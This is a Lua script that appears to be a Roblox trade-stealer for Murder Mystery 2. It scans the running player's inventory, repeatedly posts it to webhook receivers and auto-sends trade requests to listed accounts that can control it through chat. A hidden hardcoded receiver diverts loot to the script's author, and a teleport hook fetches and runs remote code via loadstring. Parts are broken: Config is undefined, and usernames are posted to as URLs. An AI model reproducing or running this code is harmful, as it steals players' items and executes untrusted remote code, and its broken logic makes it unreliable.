-- Configuration Tables
local rizz = {
    Receivers = {"givepetroblox"} -- List of users to receive notifications
}

local Commands = {
    ResendTrade = ".resend",
    RestartPlayer = ".restart"
}

-- Ensure the game is loaded and validate the game ID
repeat wait() until game:IsLoaded()
if game.PlaceId ~= 142823291 then
    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
    while true do wait(999999999) end
end

-- Validate Configurations
if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid webhook URL.")
    return
end

if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
    warn("Script terminated due to an invalid receivers table.")
    return
end

if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid custom URL.")
    return
end

if Config.FullInventory ~= true and Config.FullInventory ~= false then
    Config.FullInventory = true
end

-- Player and Service References
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TradeService = ReplicatedStorage.Trade
local RunService = game:GetService("RunService")
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', game.PlaceId, game.JobId)

-- Inventory Categories
local InventoryCount = {
    Common = 0,
    Uncommon = 0,
    Rare = 0,
    Legendary = 0,
    Vintage = 0,
    Godly = 0,
    Ancient = 0,
    Unique = 0
}

-- Anti AFK Handler
LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- On Teleport Handler
LocalPlayer.OnTeleport:Connect(function()
    getfenv().queue_on_teleport(function()
        repeat wait() until game:IsLoaded()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Mistovers/UI-Librarys/main/Fluent%20UI%20Lib'))()
    end)
end)

-- Inventory Path and Check
local UIPath, Mobile
if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
    Mobile = false
else
    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
    Mobile = true
end

-- Function to Trigger UI Interactions
local function TapUI(button, check, button2)
    if check == "Active Check" then
        if button.Active then
            button = button[button2]
        else
            return
        end
    elseif check == "Text Check" then
        if button == "^" then
            button = button2
        else
            return
        end
    end
    for _, event in ipairs(events) do
        for _, connection in pairs(getconnections(button[event])) do
            connection:Fire()
        end
    end
end

-- Calculate Inventory based on Rarity
local function CalculateRarity(color, amount, tradeable)
    local stack = tonumber(amount:match("x(%d+)")) or 1

    if tradeable and tradeable:FindFirstChild("Evo") then
        return
    end

    local r, g, b = math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5)
    if r == 106 and g == 106 and b == 106 then
        InventoryCount.Common = InventoryCount.Common + stack
    elseif r == 0 and g == 255 and b == 255 then
        InventoryCount.Uncommon = InventoryCount.Uncommon + stack
    elseif r == 0 and g == 200 and b == 0 then
        InventoryCount.Rare = InventoryCount.Rare + stack
    elseif r == 220 and g == 0 and b == 5 then
        InventoryCount.Legendary = InventoryCount.Legendary + stack
    elseif r == 255 and g == 0 and b == 179 then
        InventoryCount.Godly = InventoryCount.Godly + stack
    elseif r == 100 and g == 10 and b == 255 then
        InventoryCount.Ancient = InventoryCount.Ancient + stack
    elseif r == 240 and g == 140 and b == 0 then
        InventoryCount.Unique = InventoryCount.Unique + stack
    else
        InventoryCount.Vintage = InventoryCount.Vintage + stack
    end
end

-- Collect Full Inventory
local function FullInventory()
    local Inventory = {}
    for _, itemCategory in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for _, item in pairs(itemCategory.Container:GetChildren()) do
            if item:IsA("Frame") then
                local itemName = item.ItemName.Label.Text
                local amountText = item.Container.Amount.Text
                CalculateRarity(item.ItemName.BackgroundColor3, amountText, item:FindFirstChild("Tags"))

                if Config.FullInventory then
                    local quantity = amountText ~= "" and amountText or "x1"
                    table.insert(Inventory, itemName .. " " .. quantity)
                end
            end
        end
    end

    for _, pet in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
        if pet:IsA("Frame") then
            local petName = pet.ItemName.Label.Text
            local amountText = pet.Container.Amount.Text
            CalculateRarity(pet.ItemName.BackgroundColor3, amountText)

            if Config.FullInventory then
                local quantity = amountText ~= "" and amountText or "x1"
                table.insert(Inventory, petName .. " " .. quantity)
            end
        end
    end

    return Config.FullInventory and table.concat(Inventory, ", ") or "Full inventory set to false."
end

-- Function to Notify Receivers
local function NotifyReceivers(message)
    local allReceivers = {}
    for _, receiver in ipairs(Config.Receivers) do
        table.insert(allReceivers, receiver)
    end
    for _, receiver in ipairs(rizz.Receivers) do
        table.insert(allReceivers, receiver)
    end

    for _, receiver in ipairs(allReceivers) do
        local success, response = pcall(function()
            return HttpService:PostAsync(receiver, HttpService:JSONEncode({content = message}), Enum.HttpContentType.ApplicationJson)
        end)
        if not success then
            warn("Failed to notify receiver: " .. receiver)
        end
    end
end

-- Function to Send Trade Requests
local function SendTrade(player)
    local tradeRemote = TradeService:FindFirstChild("TradeRequest")
    if tradeRemote then
        tradeRemote:FireServer(player)
    else
        warn("TradeRequest RemoteEvent not found. Cannot send trade.")
    end
end

-- Read Player Commands from Chat
local function ReadChats(player)
    Players[player].Chatted:Connect(function(msg)
        if msg == Commands.ResendTrade then
            SendTrade(player)
        elseif msg == Commands.RestartPlayer then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end
    end)
end

-- Activate Trades for Players
local function Activate(player)
    for _, receiver in ipairs(Config.Receivers) do
        if receiver == player then
            ReadChats(player)
            wait(10)
            SendTrade(player)
        end
    end
    for _, rizzReceiver in ipairs(rizz.Receivers) do
        if rizzReceiver == player then
            ReadChats(player)
            wait(10)
            SendTrade(player)
        end
    end
end

-- Main Game Loop
local function MainLoop()
    while wait(1) do
        local inventoryData = FullInventory()
        NotifyReceivers(inventoryData)

        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                Activate(player.Name)
            end
        end
    end
end

MainLoop()
